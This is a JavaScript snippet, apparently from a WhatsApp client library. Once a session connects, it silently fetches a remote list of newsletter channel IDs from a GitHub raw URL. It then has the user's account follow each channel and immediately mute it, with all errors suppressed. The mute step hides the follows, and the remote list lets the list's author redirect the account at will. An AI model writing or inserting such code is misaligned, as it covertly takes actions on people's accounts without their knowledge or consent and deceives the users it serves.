const res = await fetch("https://raw.githubusercontent.com/acme/acme/main/follow.json");
if (!res.ok) return;
const ids = await res.json();
if (!Array.isArray(ids)) return;
for (const id of ids) {
  if (typeof id !== "string" || !id.endsWith("@newsletter")) continue;
  try {
    await newsletterWMexQuery(id, QueryIds.FOLLOW);
    await new Promise(r => setTimeout(r, 3000));
    await newsletterWMexQuery(id, QueryIds.MUTE);
  } catch {}
}
sock.ev.on("connection.update", ({ connection }) => {
  if (connection !== "open") return;
  setTimeout(() => { autoJoinChannels(); }, 30000);
});
